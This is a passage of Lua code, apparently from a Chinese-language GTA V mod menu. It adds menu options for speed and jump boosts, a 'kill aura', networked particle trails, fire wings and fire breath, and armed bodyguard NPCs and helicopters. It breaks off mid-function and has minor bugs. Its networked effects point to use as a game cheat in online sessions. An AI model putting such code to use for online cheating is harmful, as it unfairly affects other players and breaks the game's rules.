menu.rainbow(menu.colour(damage_numbers_colours_list, "默认颜色", {"damagenumcolour"}, "默认命中的颜色", damage_numbers_health_colour, true, function (value)
    damage_numbers_health_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "暴击颜色", {"damagenumcritcolour"}, "暴击颜色", damage_numbers_crit_colour, true, function (value)
    damage_numbers_crit_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "盔甲颜色", {"damagenumarmourcolour"}, "盔甲颜色", damage_numbers_armour_colour, true, function (value)
    damage_numbers_armour_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "载具颜色", {"damagenumvehiclecolour"}, "载具颜色", damage_numbers_vehicle_colour, true, function (value)
    damage_numbers_vehicle_colour = value
end))

homer = false

kill_aura_friends = false

    menu.toggle(homerdq, "Homer速度", {"homerspeed"}, "", function(on)

        if on then

        homer = on

        menu.trigger_commands("walkspeed 1.5")

        menu.trigger_commands("gracefullanding on")

        menu.trigger_commands("superrun 1.2")

        else

            menu.trigger_commands("walkspeed 1")

            menu.trigger_commands("gracefullanding off")

            menu.trigger_commands("superrun 0")

            homer = off

        end

    end,false)



    superjump = false

    menu.toggle(homerdq, "Homer跳跃", {"homerjump"}, "", function(on)

        superjump = on

    end,false)

    kill_aura = false    



    menu.toggle(homerdq, "Homer能量光环",{"homeraura"},"按e使用Homer能量光环", function(on)



        kill_aura = on



        mod_uses("ped", if on then 1 else -1)



    end)     

    kill_aura_dist = 20



    menu.slider(homerdq, "Homer能量光环范围", {"homerauraradius"}, "", 1, 100, 20, 1, function(s)



        kill_aura_dist = s



    end)



    local timer  = newTimer()

    local colour = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}

    local trailsOpt  = menu.list(interesting_features,"轨迹"), {}, ""

    menu.toggle_loop(trailsOpt,"轨迹", {"trails"}, "", function ()

        if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then

            STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)

            return

        end

        if timer.elapsed() >= 1000 then

            removeFxs(effects); effects = {}

            timer.reset()

        end

        if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then

            local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

            local minimum, maximum = v3.new(), v3.new()

            MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)

            local offsets <const> = {v3(minimum.x, minimum.y, 0.0), v3(maximum.x, minimum.y, 0.0)}

            for _, offset in ipairs(offsets) do

                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)

                local fx =

                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(

                    effect.name,

                    vehicle,

                    offset.x,

                    offset.y,

                    0.0,

                    0.0,

                    0.0,

                    0.0,

                    0.7, --scale

                    false, false, false,

                    0, 0, 0, 0

                )

                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)

                table.insert(effects, fx)

            end

        elseif ENTITY.DOES_ENTITY_EXIST(players.user_ped()) then

            for _, boneId in ipairs(bones) do

                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)

                local fx =

                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(

                    effect.name,

                    players.user_ped(),

                    0.0,

                    0.0,

                    0.0,

                    0.0,

                    0.0,

                    0.0,

                    PED.GET_PED_BONE_INDEX(players.user_ped(), boneId),

                    0.7, --scale

                    false, false, false,

                    0, 0, 0, 0

                )

                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)

                table.insert(effects, fx)

            end

        end

    end, function ()

        removeFxs(effects); effects = {}

    end)

    

    local trailColour = menu.colour(trailsOpt,"颜色", {"trailcolour"}, "",

        colour, false, function(newColour) colour = newColour end)

    menu.rainbow(trailColour)

    

    local new = {}

    local fwings = menu.list(interesting_features, "火焰翅膀", {}, "", function(); end)

    local ptfxEgg
    menu.toggle(fwings, '大火翅膀', {''}, '', function (toggle)
        fireWingsSettings.on = toggle
        if fireWingsSettings.on then
            ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
            if ptfxEgg == nil then
                local eggHash = 1803116220
                loadModel(eggHash)
                ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
            end
            for i = 1, #bigfireWings do
                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                    STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                    util.yield()
                end
                GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                bigfireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, bigfireWings[i].pos[1], 0, bigfireWings[i].pos[2], 1, false, false, false)

                util.create_tick_handler(function()
                    local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                    ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                    for i = 1, #bigfireWings do
                        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(bigfireWings[i].ptfx, fireWingsSettings.scale)
                        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(bigfireWings[i].ptfx,fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)

                    end
                    ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                    return fireWingsSettings.on
                end)
                
            end
            
            
            
        else
            for i = 1, #fireWings do
                if fireWings[i].ptfx then
                    GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                    fireWings[i].ptfx = nil
                end
                if ptfxEgg then
                    entities.delete_by_handle(ptfxEgg)
                    ptfxEgg = nil
                end
            end
            STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        end
    end)

    menu.toggle(fwings, "火翅膀", {'fireWings'},"", function (toggle)

        fireWingsSettings.on = toggle

        if fireWingsSettings.on then

            ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)

            if ptfxEgg == nil then

                local eggHash = 1803116220

                loadModel(eggHash)

                ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))

                ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)

                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)

            end

            for i = 1, #fireWings do

                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do

                    STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')

                    util.yield()

                end

                GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')

                fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)

    

                util.create_tick_handler(function()

                    local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)

                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)

                    ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)

                    for i = 1, #fireWings do

                        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)

                        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)

                    end

    

                    ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)

                    return fireWingsSettings.on

                end)

            end

        else

            for i = 1, #fireWings do

                if fireWings[i].ptfx then

                    GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)

                    fireWings[i].ptfx = nil

                end

                if ptfxEgg then

                    entities.delete_by_handle(ptfxEgg)

                    ptfxEgg = nil

                end

            end

            STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')

        end

    end)

    

    menu.slider(fwings, '大小', {'fireWingsScale'}, '', 1, 100, 3, 1, function(value)

        fireWingsSettings.scale = value / 10

    end)

    

    menu.rainbow(menu.colour(fwings, "火焰翅膀颜色", {'fireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)

        fireWingsSettings.colour = colour

    end))

    local levitationCommand = menu.ref_by_path('Self>Movement>Levitation>Levitation', 38)
    local firebreath = menu.list(interesting_features, '喷火选项', {}, '')

    local fireBreathSettings = {
        scale = 0.3,
        colour = mildOrangeFire,
        on = false,
        y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
        z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
    }

    local function transitionValue(value, target, step)
        if value == target then return value end
        return value + step * ( value > target and -1 or 1 )
    end

    function fireBreathSettings:changePos(movementType)
        self.z.value = transitionValue(self.z.value, self.z[movementType], 0.01)
        self.y.value = transitionValue(self.y.value, self.y[movementType], 0.01)
    end

    menu.toggle(firebreath, '喷火', {'JSfireBreath'}, '', function(toggle)
        fireBreathSettings.on = toggle
        if toggle then
            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                util.yield()
            end
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            fireBreathSettings.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', players.user_ped(), 0, 0.12, 0.58, 30, 0, 0, 0x8b93, fireBreathSettings.scale, false, false, false)
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
        else
            GRAPHICS.REMOVE_PARTICLE_FX(fireBreathSettings.ptfx, true)
            fireBreathSettings.ptfx = nil
            STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        end
        util.create_tick_handler(function()
            local user_ped = players.user_ped()
            if PED.GET_PED_PARACHUTE_STATE(user_ped) == 0 and ENTITY.IS_ENTITY_IN_AIR(user_ped) then
                GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, 0.81, 0, -10, 0, 0)
            elseif menu.get_value(levitationCommand) then
                GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, -0.12, 0.58, 150, 0, 0)
            else
                local movementType = 'still'
                if TASK.IS_PED_SPRINTING(user_ped) then
                    movementType = 'sprint'
                elseif TASK.IS_PED_WALKING(user_ped) then
                    movementType = 'walk'
                elseif PED.GET_PED_STEALTH_MOVEMENT(user_ped) then
                    movementType = 'sneak'
                end

                fireBreathSettings:changePos(movementType)
                GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, fireBreathSettings.y.value, fireBreathSettings.z.value, 30, 0, 0)
            end
            return fireBreathSettings.on
        end)
    end)

    menu.slider(firebreath, '喷火比例', {'JSfireBreathScale'}, '', 1, 100, fireBreathSettings.scale * 10, 1, function(value)
        fireBreathSettings.scale = value / 10
        GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireBreathSettings.ptfx, fireBreathSettings.scale)
    end)

    menu.rainbow(menu.colour(firebreath, '喷火颜色', {'JSfireBreathColour'}, '', fireBreathSettings.colour, false, function(colour)
        fireBreathSettings.colour = colour
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
    end))

    local Bodyguard_options = menu.list(interesting_features, "保镖选项", {}, "")

--------- Functions ---------
Relationship = {
    friendly_group = 0,
}

function Relationship:addGroup(GroupName)
    local ptr = memory.alloc_int()
    PED.ADD_RELATIONSHIP_GROUP(GroupName, ptr)
    local rel = memory.read_int(ptr)
    memory.free(ptr)
    return rel
end

function Relationship:friendly(ped)
    if not PED.DOES_RELATIONSHIP_GROUP_EXIST(Relationship.friendly_group) then
        Relationship.friendly_group = Relationship:addGroup("friendly_group")
        PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, Relationship.friendly_group, Relationship.friendly_group)
    end
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, Relationship.friendly_group)
end

Group = {}
function Group:getSize(ID)
    local unkPtr, sizePtr = memory.alloc(1), memory.alloc(1)
    PED.GET_GROUP_SIZE(ID, unkPtr, sizePtr)
    return memory.read_int(sizePtr)
end

function Group:pushMember(ped)
    local groupID = PLAYER.GET_PLAYER_GROUP(players.user())
    local RelationGroupHash = util.joaat("rgFM_AiLike_HateAiHate")

    if not PED.IS_PED_IN_GROUP(ped) then
        PED.SET_PED_AS_GROUP_MEMBER(ped, groupID)
        PED.SET_PED_NEVER_LEAVES_GROUP(ped, true)
    end
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, RelationGroupHash)
    PED.SET_GROUP_SEPARATION_RANGE(groupID, 9999.0)
    --PED.SET_GROUP_FORMATION_SPACING(groupID, v3(1.0, 0.9, 3.0))
    --PED.SET_GROUP_FORMATION(groupID, self.formation)
end

------------------
----- 保镖NPC -----
------------------
local Bodyguard_NPC_options = menu.list(Bodyguard_options, "保镖NPC", {}, "")

local npc_name_list_select = {
    { "富兰克林", {}, "" },
    { "麦克", {}, "" },
    { "崔佛", {}, "" },
    { "莱斯特", {}, "" },
    { "埃万保安", {}, "" },
    { "埃万重甲兵", {}, "" },
    { "越狱光头", {}, "" },
    { "吉米", {}, "麦克儿子" },
    { "崔西", {}, "麦克女儿" },
    { "阿曼达", {}, "麦克妻子" },
}
local npc_model_list_select = {
    "player_one",
    "player_zero",
    "player_two",
    "ig_lestercrest",
    "mp_m_avongoon",
    "u_m_y_juggernaut_01",
    "ig_rashcosvki",
    "ig_jimmydisanto",
    "ig_tracydisanto",
    "ig_amandatownley",
}
--生成保镖的默认设置
local bodyguard_npc_set = {
    model = "player_one",
    godmode = false,
    health = 1000,
    no_ragdoll = false,
    weapon = "WEAPON_MICROSMG",
    no_clip = false,
    see_hear_range = 500,
    accuracy = 100,
    shoot_rate = 1000,
    combat_ability = 2,
    combat_range = 2,
    combat_movement = 1,
    target_loss_response = 1,
    BF_PerfectAccuracy = false,
    BF_AlwaysEquipBestWeapon = false,
}
--生成的保镖
local bodyguard_npc_list = {}

menu.list_select(Bodyguard_NPC_options, "选择模型", {}, "", npc_name_list_select, 1, function(value)
    bodyguard_npc_set.model = npc_model_list_select[value]
end)

local Bodyguard_NPC_default_setting = menu.list(Bodyguard_NPC_options, "默认生成设置", {}, "")
menu.toggle(Bodyguard_NPC_default_setting, "无敌", {}, "", function(toggle)
    bodyguard_npc_set.godmode = toggle
end)
menu.slider(Bodyguard_NPC_default_setting, "生命", { "bodyguard_npc_health" }, "", 100, 30000, 1000, 100,
    function(value)
        bodyguard_npc_set.health = value
    end)
menu.toggle(Bodyguard_NPC_default_setting, "不会摔倒", {}, "", function(toggle)
    bodyguard_npc_set.no_ragdoll = toggle
end)
menu.list_select(Bodyguard_NPC_default_setting, "武器", {}, "", WeaponName_ListItem, 4, function(value)
    bodyguard_npc_set.weapon = WeaponModel_List[value]
end)
menu.toggle(Bodyguard_NPC_default_setting, "不换弹夹", {}, "", function(toggle)
    bodyguard_npc_set.no_clip = toggle
end)
menu.divider(Bodyguard_NPC_default_setting, "作战能力")
menu.slider(Bodyguard_NPC_default_setting, "视力听觉范围", { "bodyguard_npc_see_hear_range" }, "", 10, 1000, 500,
    100,
    function(value)
        bodyguard_npc_set.see_hear_range = value
    end)
menu.slider(Bodyguard_NPC_default_setting, "精确度", { "bodyguard_npc_accuracy" }, "", 0, 100, 100, 10,
    function(value)
        bodyguard_npc_set.accuracy = value
    end)
menu.slider(Bodyguard_NPC_default_setting, "射击频率", { "bodyguard_npc_shoot_rate" }, "", 0, 1000, 1000, 100,
    function(value)
        bodyguard_npc_set.shoot_rate = value
    end)
menu.list_select(Bodyguard_NPC_default_setting, "作战技能", {}, "", { { "弱" }, { "普通" }, { "专业" } }, 3,
    function(value)
        bodyguard_npc_set.combat_ability = value - 1
    end)
menu.list_select(Bodyguard_NPC_default_setting, "作战范围", {}, "", { { "近" }, { "中等" }, { "远" }, { "非常远" } }
    , 3, function(value)
    bodyguard_npc_set.combat_range = value - 1
end)
menu.list_select(Bodyguard_NPC_default_setting, "作战走位", {}, "", { { "站立" }, { "防卫" }, { "会前进" },
    { "会后退" } }, 2, function(value)
    bodyguard_npc_set.combat_movement = value - 1
end)
menu.list_select(Bodyguard_NPC_default_setting, "失去目标时反应", {}, "", { { "退出战斗" }, { "从不失去目标" },
    { "寻找目标" } }, 2, function(value)
    bodyguard_npc_set.target_loss_response = value - 1
end)
menu.divider(Bodyguard_NPC_default_setting, "作战属性")
menu.toggle(Bodyguard_NPC_default_setting, "完美精准度", {}, "", function(toggle)
    bodyguard_npc_set.BF_PerfectAccuracy = toggle
end)
menu.toggle(Bodyguard_NPC_default_setting, "总是装备最好的武器", {}, "", function(toggle)
    bodyguard_npc_set.BF_AlwaysEquipBestWeapon = toggle
end)
------
menu.action(Bodyguard_NPC_options, "生成保镖", {}, "", function()
    local groupID = PLAYER.GET_PLAYER_GROUP(players.user())
    if Group:getSize(groupID) >= 7 then
        notification("保镖人数已达到上限")
    else
        local modelHash = util.joaat(bodyguard_npc_set.model)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 2.0, 0.0)
        local heading = ENTITY.GET_ENTITY_HEADING(players.user_ped()) + 180
        local ped = Create_Network_Ped(26, modelHash, coords.x, coords.y, coords.z, heading)
        --BLIP
        local blip = HUD.ADD_BLIP_FOR_ENTITY(ped)
        HUD.SET_BLIP_SPRITE(blip, 271)
        HUD.SET_BLIP_COLOUR(blip, 3)
        HUD.SET_BLIP_SCALE(blip, 0.5)
        --INVINCIBLE
        ENTITY.SET_ENTITY_INVINCIBLE(ped, bodyguard_npc_set.godmode)
        ENTITY.SET_ENTITY_PROOFS(ped, bodyguard_npc_set.godmode, bodyguard_npc_set.godmode, bodyguard_npc_set.godmode,
            bodyguard_npc_set.godmode, bodyguard_npc_set.godmode, bodyguard_npc_set.godmode, bodyguard_npc_set.godmode,
            bodyguard_npc_set.godmode)
        --HEALTH
        ENTITY.SET_ENTITY_MAX_HEALTH(ped, bodyguard_npc_set.health)
        ENTITY.SET_ENTITY_HEALTH(ped, bodyguard_npc_set.health)
        --RAGDOLL
        PED.SET_PED_CAN_RAGDOLL(ped, not bodyguard_npc_set.no_ragdoll)
        PED.DISABLE_PED_INJURED_ON_GROUND_BEHAVIOUR(ped)
        PED.SET_PED_CAN_PLAY_AMBIENT_ANIMS(ped, false)
        PED.SET_PED_CAN_PLAY_AMBIENT_BASE_ANIMS(ped, false)
        --WEAPON
        local weapon_smoke = util.joaat("WEAPON_SMOKEGRENADE")
        WEAPON.GIVE_WEAPON_TO_PED(ped, weapon_smoke, -1, false, false)
        local weaponHash = util.joaat(bodyguard_npc_set.weapon)
        WEAPON.GIVE_WEAPON_TO_PED(ped, weaponHash, -1, false, true)
        WEAPON.SET_CURRENT_PED_WEAPON(ped, weaponHash, false)
        WEAPON.SET_PED_DROPS_WEAPONS_WHEN_DEAD(ped, false)
        PED.SET_PED_CAN_SWITCH_WEAPON(ped, true)
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, bodyguard_npc_set.no_clip)
        --PERCEPTIVE
        PED.SET_PED_SEEING_RANGE(ped, bodyguard_npc_set.see_hear_range)
        PED.SET_PED_HEARING_RANGE(ped, bodyguard_npc_set.see_hear_range)
        PED.SET_PED_ID_RANGE(ped, bodyguard_npc_set.see_hear_range)
        --PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(bodyguard_npc_set.see_hear_range)
        PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
        PED.SET_PED_VISUAL_FIELD_MIN_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MAX_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MIN_ELEVATION_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MAX_ELEVATION_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_CENTER_ANGLE(ped, 90.0)
        --COMBAT
        PED.SET_PED_COMBAT_ABILITY(ped, bodyguard_npc_set.combat_ability)
        PED.SET_PED_COMBAT_RANGE(ped, bodyguard_npc_set.combat_range)
        PED.SET_PED_COMBAT_MOVEMENT(ped, bodyguard_npc_set.combat_movement)
        PED.SET_PED_TARGET_LOSS_RESPONSE(ped, bodyguard_npc_set.target_loss_response)
        --COMBAT ATTRIBUTES
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 0, true) --Use Cover
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 1, true) --Use Vehicle
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 4, true) --Can Use Dynamic Strafe Decisions
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true) --Always Fight
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 13, true) --Aggressive
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 17, false) --Always Flee
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true) --Can Taunt In Vehicle
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 21, true) --Can Chase Target On Foot
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 24, true) --Use Proximity Firing Rate
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 39, true) --Can Bust
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 41, true) --Can Commandeer Vehicles
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 42, true) --Can Flank
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true) --Can Fight Armed Peds When Not Armed
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 49, false) --Use Enemy Accuracy Scaling
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 52, true) --Use Vehicle Attack
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 53, true) --Use Vehicle Attack If Vehicle Has Mounted Guns
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 55, true) --Can See Underwater Peds
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 58, true) --Disable Flee From Combat
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 60, true) --Can Throw Smoke Grenade
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 78, true) --Disable All Randoms Flee

        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 27, bodyguard_npc_set.BF_PerfectAccuracy) --Perfect Accuracy
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 54, bodyguard_npc_set.BF_AlwaysEquipBestWeapon) --Always Equip Best Weapon
        --TASK
        TASK.SET_PED_PATH_CAN_USE_CLIMBOVERS(ped, true)
        TASK.SET_PED_PATH_CAN_USE_LADDERS(ped, true)
        TASK.SET_PED_PATH_CAN_DROP_FROM_HEIGHT(ped, true)
        TASK.SET_PED_PATH_AVOID_FIRE(ped, false)
        TASK.SET_PED_PATH_MAY_ENTER_WATER(ped, true)

        ----
        Group:pushMember(ped)
        table.insert(bodyguard_npc_list, ped)
    end
end)

menu.divider(Bodyguard_NPC_options, "管理保镖")
menu.toggle(Bodyguard_NPC_options, "所有保镖无敌", {}, "", function(toggle)
    for k, ent in pairs(bodyguard_npc_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            ENTITY.SET_ENTITY_INVINCIBLE(ent, toggle)
            ENTITY.SET_ENTITY_PROOFS(ent, toggle, toggle, toggle, toggle, toggle, toggle, toggle, toggle)
        end
    end
end)
menu.list_action(Bodyguard_NPC_options, "给予所有保镖武器", {}, "", WeaponName_ListItem, function(value)
    for k, ent in pairs(bodyguard_npc_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            local weaponHash = util.joaat(WeaponModel_List[value])
            WEAPON.GIVE_WEAPON_TO_PED(ent, weaponHash, -1, false, true)
            WEAPON.SET_CURRENT_PED_WEAPON(ent, weaponHash, false)
        end
    end
end)
menu.action(Bodyguard_NPC_options, "所有保镖传送到我", {}, "", function()
    local y = 2.0
    for k, ent in pairs(bodyguard_npc_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            TP_TO_ME(ent, 0.0, y, 0.0)
            SET_ENTITY_HEAD_TO_ENTITY(ent, players.user_ped(), 180.0)
            y = y + 1.0
        end
    end
end)
menu.action(Bodyguard_NPC_options, "删除已死亡保镖", {}, "", function()
    for k, ent in pairs(bodyguard_npc_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            if ENTITY.IS_ENTITY_DEAD(ent) then
                entities.delete_by_handle(ent)
                table.remove(bodyguard_npc_list, k)
            end
        end
    end
end)
menu.action(Bodyguard_NPC_options, "删除所有保镖", {}, "", function()
    for k, ent in pairs(bodyguard_npc_list) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            entities.delete_by_handle(ent)
        end
    end
    bodyguard_npc_list = {} --生成的保镖
end)


--------------------
----- 保镖直升机 -----
--------------------
local Bodyguard_Heli_options = menu.list(Bodyguard_options, "保镖直升机", {}, "")

local heli_list = {} --生成的直升机
local heli_ped_list = {} --直升机内的保镖

local bodyguard_heli = {
    name = "valkyrie",
    heli_godmode = false,
    ped_godmode = false
}

local heli_name_list_select = {
    { "女武神" },
    { "秃鹰" },
    { "猎杀者" },
    { "警用小蛮牛" },
}
local heli_model_list_select = {
    "valkyrie", "buzzard", "hunter", "polmav"
}
menu.list_select(Bodyguard_Heli_options, "直升机类型", {}, "", heli_name_list_select, 1,
    function(value)
        bodyguard_heli.name = heli_model_list_select[value]
    end)

menu.toggle(Bodyguard_Heli_options, "直升机无敌", {}, "", function(toggle)
    bodyguard_heli.heli_godmode = toggle
end)

menu.action(Bodyguard_Heli_options, "生成保镖直升机", {}, "", function()
    local heli_hash = util.joaat(bodyguard_heli.name)
    local ped_hash = util.joaat("s_m_y_blackops_01")
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x + math.random(-10, 10)
    pos.y = pos.y + math.random(-10, 10)
    pos.z = pos.z + 30

    Request_Model(ped_hash)
    Request_Model(heli_hash)
    Relationship:friendly(players.user_ped())
    local heli = entities.create_vehicle(heli_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)

    if not ENTITY.DOES_ENTITY_EXIST(heli) then
        notification("Failed to create vehicle. Please try again")
        return
    else
        local heliNetId = NETWORK.VEH_TO_NET(heli)
        if NETWORK.NETWORK_GET_ENTITY_IS_NETWORKED(NETWORK.NET_TO_PED(heliNetId)) then
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(heliNetId, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(heliNetId, players.user(), true)
        end
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        VEHICLE.SET_VEHICLE_SEARCHLIGHT(heli, true, true)
        add_blip_for_entity(heli, 422, 26)
        --health
        ENTITY.SET_ENTITY_INVINCIBLE(heli, bodyguard_heli.heli_godmode)
        ENTITY.SET_ENTITY_MAX_HEALTH(heli, 10000)
        ENTITY.SET_ENTITY_HEALTH(heli, 10000)

        table.insert(heli_list, heli)
    end

    local pilot = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)
    TASK.TASK_HELI_MISSION(pilot, heli, 0, players.user_ped(), 0.0, 0.0, 0.0, 23, 80.0, 50.0, -1.0, 0, 10, -1.0, 0)
    PED.SET_PED_KEEP_TASK(pilot, true)

    PED.SET_PED_HIGHLY_PERCEPTIVE(pilot, true)
    PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(pilot, 500.0)
    PED.SET_PED_SEEING_RANGE(pilot, 500.0)
    PED.SET_PED_HEARING_RANGE(pilot, 500.0)
    PED.SET_PED_ID_RANGE(pilot, 500.0)

    PED.SET_PED_COMBAT_MOVEMENT(pilot, 1) --Defensive
    PED.SET_PED_COMBAT_ABILITY(pilot, 2) --Professional
    PED.SET_PED_COMBAT_RANGE(pilot, 1) --Medium
    PED.SET_PED_TARGET_LOSS_RESPONSE(pilot, 1) --NeverLoseTarget

    PED.SET_COMBAT_FLOAT(pilot, 10, 500.0)
    PED.SET_PED_CAN_BE_SHOT_IN_VEHICLE(pilot, false)
    --health
    PED.SET_PED_MAX_HEALTH(pilot, 10000)
